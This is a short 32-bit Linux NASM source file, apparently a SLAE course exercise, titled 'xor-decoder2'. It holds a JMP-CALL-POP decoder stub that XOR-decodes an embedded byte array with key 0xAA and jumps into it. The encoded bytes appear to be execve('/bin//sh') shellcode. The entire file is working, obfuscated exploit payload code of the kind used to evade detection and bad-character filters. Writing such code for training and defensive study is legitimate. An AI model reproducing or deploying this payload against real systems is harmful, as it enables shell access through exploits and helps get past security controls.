; Executable name       : xor-decoder2
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of xor encoded shellcode
;			  without static counter. 36 bytes vs 39
;

SECTION .text

global _start

_start:

	jmp short call_decoder				; JMP to call_decoder

decoder:
	pop ebx						; POP our shellcode address
							; into EBX

decode:
	xor byte [ebx],0xAA				; XOR every byte in EBX with
							; 0xAA

	jz shellcode					; if the ZF flag is set jump
							; to the decoded shellcode
							; xor 0xaa,0xaa = 0 :)

	inc ebx						; if ZF flag not set continue
							; increment

	jmp short decode				; make a short JMP to loop back


call_decoder:
	call decoder					; CALL the decoder

shellcode:
	db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2	; prevously encoded
	db 0xc2,0x85,0xc8,0xc3,0xc4,0x1a,0xa1,0x23	; shellcode. plus
	db 0x49,0x67,0x2a,0xaa				; 0xaa appended

